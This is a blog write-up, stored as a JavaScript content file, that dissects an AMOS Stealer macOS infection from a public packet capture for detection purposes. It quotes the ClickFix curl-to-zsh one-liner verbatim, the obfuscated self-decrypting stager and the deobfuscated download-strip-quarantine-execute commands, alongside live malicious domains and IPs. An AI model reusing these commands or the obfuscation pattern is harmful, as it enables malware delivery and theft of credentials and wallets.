// Write-up: Dissecting an AMOS Stealer infection, packet by packet
// Content is stored as structured blocks rendered by components/WriteupBody.js
// Inline formatting in paragraphs: **bold**, `code`, [text](url)

const MTA = 'https://www.malware-traffic-analysis.net/2026/10/02/index.html';

const meta = {
  slug: 'dissecting-amos-stealer-packet-by-packet',
  title: 'Dissecting an AMOS Stealer infection, packet by packet',
  date: '2026-10-21',
  dateLabel: 'October 2026',
  readTime: '14 min read',
  tags: ['macos', 'stealer', 'network-analysis', 'clickfix'],
  cover: '/writeups/amos-stealer/banner.jpg',
  description:
    'A Friday-night capture, 19 minutes of traffic, and one very fake Claude Code ad — the packet evidence, decoding intermediates, and byte-math behind an AMOS Stealer infection.',
};

const blocks = [
  {
    type: 'p',
    text: 'October 2026 — a Friday-night capture, 19 minutes of traffic, and one very fake Claude Code ad.',
  },
  {
    type: 'p',
    text: 'I pulled this infection apart a couple of weeks ago and I\'ve been sitting on the notes. Figured it was time to write it up properly — not the IOC-list style write-up (Brad already did that over at [malware-traffic-analysis.net](' + MTA + '), and this exercise uses his capture and extracted files), but the *how I actually know what I know* version. Packet evidence, hashes, the decoding steps in between, and the math at the end.',
  },
  {
    type: 'callout',
    variant: 'info',
    title: 'Source & acknowledgements',
    text: 'Capture `2026-10-02-AMOS-Stealer-traffic.pcap` (24,543,966 bytes) and extracted files `2026-10-02-AMOS-Stealer-files.zip` were originally published by **Brad Duncan** at [malware-traffic-analysis.net](' + MTA + ') — see the reproduction hashes below. His write-up covers the *what*; this one covers how I know what I know.',
  },
  {
    type: 'h2',
    text: 'The 30-second version',
  },
  {
    type: 'p',
    text: 'The victim searched Google for **Claude Code**, clicked a **sponsored result**, got bounced through `uerp.com` to `claude-desk-code.com`, and pasted an "installer" command into a terminal. That command was **ClickFix** — a base64-wrapped `curl | zsh`. Nineteen minutes later the machine had a Mach-O stealer in `/tmp`, two fake-Apple LaunchDaemons, and **3.7 MB of wallet/cloud-credential data** on a server in someone else\'s hands.',
  },
  {
    type: 'image',
    src: '/writeups/amos-stealer/infection-chain.png',
    alt: 'AMOS infection chain: ClickFix lure to exfiltration',
    caption: 'The infection chain, packet by packet — ClickFix lure, staged download, persistence, and the exfiltration.',
  },
  {
    type: 'p',
    text: 'Here\'s the whole thing on one line of DNS, straight from the pcap:',
  },
  {
    type: 'table',
    headers: ['Time from capture', 'Protocol', 'Domain', 'Observation'],
    rows: [
      ['0 s', 'DNS', 'uerp.com / claude-desk-code.com', 'lure — the fake Claude Code ad'],
      ['98.20', 'DNS', 'lake-90.com.', 'stager fetched here'],
      ['98.71', 'DNS', 'loop-88.com.', 'first telemetry beacon'],
      ['254.35', 'DNS', 'delta-canvas.com.', 'persistence downloads'],
    ],
    highlightLast: false,
  },
  {
    type: 'p',
    text: 'Read those timestamps twice. The lure DNS happens in the **first second** of the capture. The stager doesn\'t land until **t+98 s** — that\'s a human reading a fake download page and copy-pasting. And then look at the gap between 98 s and 254 s. More on that later, because that gap is the most interesting thing in this whole capture.',
  },
  {
    type: 'h2',
    text: 'Packet-level evidence',
  },
  {
    type: 'p',
    text: 'I don\'t have Wireshark on this box, so I wrote a small Python pcap parser — Ethernet/IPv4/TCP/UDP decode, SYN-anchored flows, DNS name extraction. **27,893 packets, 19.6 minutes, 150 TCP flows.** Here\'s the infection as the wire saw it.',
  },
  {
    type: 'h3',
    text: 'The telemetry burst right after the Mach-O lands',
  },
  {
    type: 'p',
    text: 'Six POSTs in under a second, every one of them `User-Agent: curl/`, each from a different source port:',
  },
  {
    type: 'table',
    headers: ['Time (s)', 'Protocol', 'Source', 'Destination', 'Size', 'HTTP Request'],
    mono: true,
    rows: [
      ['101.21', 'TCP', '10.10.2.178:49159', '152.42.143.45:80', '346 B', 'POST /api/metrics/run HTTP/1.1'],
      ['101.63', 'TCP', '10.10.2.178:49160', '152.42.143.45:80', '352 B', 'POST /api/metrics/run HTTP/1.1'],
      ['101.68', 'TCP', '10.10.2.178:49161', '152.42.143.45:80', '350 B', 'POST /api/metrics/run HTTP/1.1'],
      ['101.81', 'TCP', '10.10.2.178:49162', '152.42.143.45:80', '351 B', 'POST /api/metrics/run HTTP/1.1'],
      ['101.87', 'TCP', '10.10.2.178:49163', '152.42.143.45:80', '348 B', 'POST /api/metrics/run HTTP/1.1'],
      ['101.91', 'TCP', '10.10.2.178:49164', '152.42.143.45:80', '347 B', 'POST /api/metrics/run HTTP/1.1'],
    ],
  },
  {
    type: 'p',
    text: 'Six ~350-byte POSTs, fired 0.5–0.6 s apart, straight off the stager\'s execution. Those are the stage-tracking beacons (`event=stager`), one per pipeline step. If you see a Mac making short curl-UA POSTs to a bare IP in tight sequence, that\'s this pattern.',
  },
  {
    type: 'h3',
    text: 'The exfiltration, bucketed by uploaded bytes',
  },
  {
    type: 'code',
    lang: 'text',
    title: 'Uploaded bytes, 10-second windows (10.10.2.178 → 152.42.143.45)',
    content: `t=100–110s : 0.01 MB   (telemetry)
t=240–250s : 3.08 MB   <- the exfiltration
t=250–260s : 0.68 MB

total bytes 10.10.2.178 -> 152.42.143.45 over the whole capture: 3,775,146`,
  },
  {
    type: 'p',
    text: 'One connection. **7.2 seconds. 3.76 MB going up** to a bare IP on port 80, in a capture where the median "big" upload before that was a 10 KB webpage asset. You don\'t need an IOC list to flag that — you need a byte-counter and one comparison against the host\'s own baseline.',
  },
  {
    type: 'h3',
    text: 'Why volume-based triage misses it',
  },
  {
    type: 'p',
    text: 'The CSV below is my eta-ranked triage of the capture\'s flows — a "show me the biggest talkers first" pass. Notice where the actual IOC flows land. The exfiltration to `152.42.143.45` doesn\'t even crack the **top 30**. Plain CDN and Apple traffic buries it:',
  },
  {
    type: 'table',
    headers: ['Rank', 'Destination', 'Port', 'Relative time', 'Bytes', 'Verdict'],
    mono: true,
    rows: [
      ['1', '104.18.41.41', '443', 't+947s', '10,561', ''],
      ['2', '172.67.149.20', '443', 't+946s', '8,599', ''],
      ['5', '151.101.180.116', '443', 't+945s', '7,347', ''],
      ['13', '199.91.221.4', '80', 't+1153s', '437', 'IOC — C2'],
      ['29', '199.91.221.4', '49178', 't+1153s', '360', 'IOC — C2'],
      ['34', '152.42.143.45', '80', 't+207s', '676', 'IOC — exfil channel'],
      ['58', '152.42.143.45', '80', 't+242s', '674', 'IOC — exfil channel'],
      ['97', '152.42.143.45', '49159', 't+96s', '319', 'IOC — beacon'],
    ],
    highlightRows: [3, 4, 5, 6, 7],
  },
  {
    type: 'p',
    text: 'The whole malicious footprint — beacons, staging, exfiltration — ranks between **13 and 97** by volume. Sorting by bytes is a CDN popularity contest. The anomaly isn\'t that these flows are big; it\'s that a Mac that never uploads anything suddenly sends 3.76 MB to a bare IP on port 80. Baseline the host, not the network.',
  },
  {
    type: 'download',
    href: '/writeups/amos-stealer/amos_triage.csv',
    label: 'amos_triage.csv',
    note: 'Full eta-ranked flow triage (100 flows) with IOC flags.',
  },
  {
    type: 'h2',
    text: 'The artifacts and their hashes',
  },
  {
    type: 'p',
    text: 'Everything below is what the infection dropped or what Brad extracted; hashes recomputed by me from the working copies.',
  },
  {
    type: 'table',
    headers: ['SHA-256', 'Artifact', 'Size / Notes'],
    mono: true,
    rows: [
      ['28d369dc858136b1199fa70ece32475755f3df7128…', 'stager zsh script', '3,106 B'],
      ['b8203f746809b2d4ba30cf…', 'stager, layer-1 decoded', '1,744 B'],
      ['39c699ce274b83dfdebd15d54899485ac9934dfb…', 'stager, layer-2 deobfuscated', '1,162 B'],
      ['5b5e18302d0191831d267429120598d2f274f7ae…', 'Mach-O payload (/tmp/.zxqa03cu)', 'universal binary, 2 archs'],
    ],
  },
  {
    type: 'p',
    text: 'The three stager hashes matter more than they look. They are the **decoding intermediates** — proof of the path from "what the victim pasted" to "what actually ran" — and each step is reversible.',
  },
  {
    type: 'image',
    src: '/writeups/amos-stealer/terminal-01-macho-ident.jpg',
    alt: 'file, sha256sum and xxd output on the Mach-O payload',
    caption: 'The payload is a Mach-O universal binary (fat header cafe babe, two architectures) — identified by file, hashed, and hex-dumped.',
  },
  {
    type: 'image',
    src: '/writeups/amos-stealer/terminal-02-strings-recon.jpg',
    alt: 'String reconnaissance on the stealer binary',
    caption: 'String reconnaissance on the stealer binary — the interesting URLs don\'t appear as plaintext; they live behind the layers below.',
  },
  {
    type: 'h2',
    text: 'Decoding intermediates',
  },
  {
    type: 'h3',
    text: 'Step 1 — what the page told the victim to paste',
  },
  {
    type: 'code',
    lang: 'bash',
    title: 'The ClickFix command, verbatim from the fake download page',
    content: `echo "Downloading Claude: https://claude.ai/install.sh" && curl -s $(echo "aHR0cHM6Ly9sYWtlLTkwLmNvbS9jdXJsL2V2MjRzdmdwL3Y2ZzhoNzUyMGgyMGNzZjJyb2JrOW0uanNvbg==" | openssl base64 -d -A) | zsh`,
  },
  {
    type: 'p',
    text: 'The base64 decodes to the stager URL — I ran it, you can run it:',
  },
  {
    type: 'code',
    lang: 'bash',
    title: 'base64 decode → stager URL',
    content: `$ base64 -d <<< 'aHR0cHM6Ly9sYWtlLTkwLmNvbS9jdXJsL2V2MjRzdmdwL3Y2ZzhoNzUyMGgyMGNzZjJyb2JrOW0uanNvbg=='
https://lake-90.com/curl/ev24svgp/v6g8h7520h20csf2robk9m.json`,
  },
  {
    type: 'image',
    src: '/writeups/amos-stealer/terminal-03-clickfix-decode.jpg',
    alt: 'Base64 decode of the ClickFix payload revealing the stager URL',
    caption: 'One base64 layer down and the "Claude installer" is already a plain curl to lake-90.com.',
  },
  {
    type: 'h3',
    text: 'Step 2 — the stager itself',
  },
  {
    type: 'p',
    text: 'The downloaded script is a zsh file that hides everything behind octal-escaped printf fragments. `\\155\\144\\065` is "md5". `\\170\\170\\144` is "xxd". And the payload is an AES-128-CTR blob that decrypts itself:',
  },
  {
    type: 'code',
    lang: 'bash',
    title: 'Self-decrypting payload inside the stager',
    content: `zk4wo=$(printf '\\155\\144\\065')      # md5
r5k1r=$(printf '\\170\\170\\144')      # xxd
s6wc='op'; hjrh='enssl'
slyo='gunz'; u7cw='ip'
_k=$(printf '%s' "$_kb" | \${zk4wo})
_r=$(printf '%s' "\${_pack[@]}" | \${r5k1r} -r -p | \${s6wc}\${hjrh} enc -d -aes-128-ctr \\
     -K "$_k" -iv 00000000000000000000000000000000 | \${slyo}\${u7cw})
/bin/zsh -c "$_r"`,
  },
  {
    type: 'p',
    text: 'The key `_k` is derived as md5() of an arithmetic expression over the lengths of decoy variables (`_channel`, `_flavor`, `_fanout`) — that\'s hash `28d369dc…` above. Run the decryption and you get the 1,744-byte intermediate.',
  },
  {
    type: 'image',
    src: '/writeups/amos-stealer/decoding-workflow.png',
    alt: 'Six-step decoding workflow from ClickFix command to Mach-O payload',
    caption: 'The full decoding workflow: ClickFix command → base64 → zsh stager → deobfuscation → AES-128-CTR → Mach-O payload.',
  },
  {
    type: 'h3',
    text: 'Step 3 — what the intermediate actually says',
  },
  {
    type: 'code',
    lang: 'bash',
    title: 'Deobfuscated stager, layer 2',
    content: `b2ya6r=$(printf 'https://loop-88.com/api/metrics/run?event=pasted')
\${h89j4} ... -X POST -H 'user: AgLfxMKu…' -H 'BuildID: AgLUSkA5…' "\${b2ya6r}" ... &
hhd4qn=$(printf 'https://lake-90.com/f/fhi5wsf_mpmq1dks3tn4hw/oyn2lshh')
ejkpln=$(printf '/tmp/.zxqa03cu')
\${h89j4} -fsSL -o \${t2uljk} \${hhd4qn} && mv ... && \${s9tdi} -c \${ejkpln} && \${vyeu3} +x \${ejkpln} \\
  && { ... POST ...event=stager ... & } && \${ejkpln}`,
  },
  {
    type: 'p',
    text: 'Beacon **"pasted"**. Download the Mach-O to `/tmp/.zxqa03cu`. `xattr -c` — strip the quarantine attribute, goodbye Gatekeeper. `chmod +x`. Beacon **"stager"**. Execute. That `xattr -c` is one command and it quietly deletes macOS\'s main defense against exactly this class of thing. (Hash `39c699ce…` is this readable version.)',
  },
  {
    type: 'callout',
    variant: 'warn',
    title: 'The tokens are campaign telemetry',
    text: 'The two hard-coded `user:` / `BuildID:` tokens are per-stage campaign trackers. Whoever runs this operation is measuring which lures convert — this is an operation with marketing analytics, not a one-off.',
  },
  {
    type: 'h2',
    text: 'Persistence, in their own files',
  },
  {
    type: 'p',
    text: 'The persistence mechanism is two LaunchDaemons wearing Apple nametags. The plist, verbatim:',
  },
  {
    type: 'code',
    lang: 'xml',
    title: 'com.apple.accountsd.helper.plist — fake Apple, real persistence',
    content: `<key>Label</key>
<string>com.apple.accountsd.helper</string>
<key>ProgramArguments</key>
<array>
    <string>/bin/bash</string>
    <string>/Users/foster.greyson/Library/Application Support/.com.apple.accountsd/.service</string>
</array>
<key>RunAtLoad</key><true/>
<key>KeepAlive</key><true/>`,
  },
  {
    type: 'image',
    src: '/writeups/amos-stealer/terminal-04-persistence-plist.jpg',
    alt: 'LaunchDaemon plist pointing to a bash wrapper in a hidden directory',
    caption: 'Both persistence binaries are Mach-O universal binaries; the plist points to a bash wrapper hidden in a dot-directory.',
  },
  {
    type: 'p',
    text: '`com.apple.accountsd.helper` is not an Apple label. `com.apple.metadata.mds.worker` — the second one — is also not an Apple label. Both directories start with a dot so they don\'t show in Finder. **RunAtLoad + KeepAlive** means: at every boot, forever, launch this bash wrapper, and if it ever dies, relaunch it.',
  },
  {
    type: 'p',
    text: 'The wrapper itself and the config files sit in those hidden directories — `cfg.txt`, `session.txt`, `auth.txt` — little nine-to-forty-three-byte text files with hashes of their own (see the table in the PDF; I hashed everything, even the 4-byte `pid.txt`, because why not).',
  },
  {
    type: 'image',
    src: '/writeups/amos-stealer/terminal-05-service-wrapper.jpg',
    alt: 'Dropped service wrapper and its config file',
    caption: 'The dropped service wrapper and its config — small, boring-looking text files doing operational bookkeeping.',
  },
  {
    type: 'h2',
    text: 'The part nobody puts in an IOC list',
  },
  {
    type: 'p',
    text: 'Here\'s the thing I keep coming back to. Between the telemetry burst at t≈102 s and the exfiltration at t≈247 s there are **145 seconds** where the network is silent and the malware is extremely busy.',
  },
  {
    type: 'image',
    src: '/writeups/amos-stealer/gap-timeline.png',
    alt: 'Timeline showing the 145-second visibility gap between telemetry and exfiltration',
    caption: 'The 145-second gap: network-silent, host-busy. The credential harvest lived entirely inside it.',
  },
  {
    type: 'p',
    text: 'Brad\'s extracted file list tells you what it was doing: staging `/tmp/25823/deskwallets/Binance/`, `/tmp/25823/deskwallets/TonKeeper/`, `/tmp/25823/FileGrabber/aws/`, `docker/`, `filezilla/`, `gcloud/`, `zsh_history`, `/tmp/25823/passmgr/Bitwarden/`, `/tmp/25823/Telegram Data/` — wallets, cloud credentials, password-manager databases, Telegram sessions. Then it zipped it all, sent the zip, and deleted it.',
  },
  {
    type: 'callout',
    variant: 'signal',
    title: 'Detection takeaway',
    text: 'Watch for the **exit** of the gap, not the entry: a Mac going from network silence to a multi-megabyte upload to a bare IP on port 80 is the single loudest moment in this entire capture. Egress byte counters against a per-host baseline catch it; IOC-matching misses it entirely.',
  },
  {
    type: 'h2',
    text: 'IOCs (condensed)',
  },
  {
    type: 'list',
    items: [
      '**Domains:** uerp.com, claude-desk-code.com, lake-90.com, loop-88.com, delta-canvas.com',
      '**IPs:** 152.42.143.45, 199.91.221.4, 193.233.210.226',
      '**Files/paths:** /tmp/.zxqa03cu, ~/Library/Application Support/.com.apple.accountsd/, ~/Library/Application Support/.com.apple.metadata.mds/ — LaunchDaemon plists above',
      '**URIs:** /api/metrics/run, /api/join/, /ws/sync/x3, /api/tasks/, /api/feed/register',
    ],
  },
  {
    type: 'p',
    text: 'Full hashes in the table above. YARA + KQL for the hunt live in my [Detection-rules repo](https://github.com/PMorningstar98/Detection-rules).',
  },
  {
    type: 'h2',
    text: 'Takeaways',
  },
  {
    type: 'list',
    ordered: true,
    items: [
      '**ClickFix beat the user, not the OS.** No exploit — a paste. Detection has to live in process lineage (`zsh` → `curl` → `openssl` → `/bin/zsh -c`), not in "malware downloaded" alerts.',
      '**`xattr -c` is the whole bypass.** One flag. Hunt it on temp dot-files.',
      '**The exfil is a byte anomaly, not a signature.** 3.7 MB up to a bare IP:80. Your egress byte counters are the detector.',
      '**Watch the gaps, not just the events.** 145 s of silence mid-intrusion is where the credential harvest lived. Network-only monitoring misses most of the attack; endpoint or it didn\'t happen.',
    ],
  },
  {
    type: 'divider',
  },
  {
    type: 'p',
    text: '*Hashes, packets, and intermediates verified 2026-10-21 against the working copies. Parser: my own (pure Python, no libpcap bindings). The framework and detection pack referenced above are public.*',
  },
  {
    type: 'callout',
    variant: 'info',
    title: 'Reproduce this analysis',
    text: 'Everything above reproduces from two files published by Brad Duncan at [malware-traffic-analysis.net](' + MTA + '): the pcap `2026-10-02-AMOS-Stealer-traffic.pcap` (SHA-256 `6dbf6dd2…48d5a`) and `2026-10-02-AMOS-Stealer-files.zip` (SHA-256 `68a91158…e15f`). Grab the capture, run the parser, check the math.',
  },
];

export default { meta, blocks };
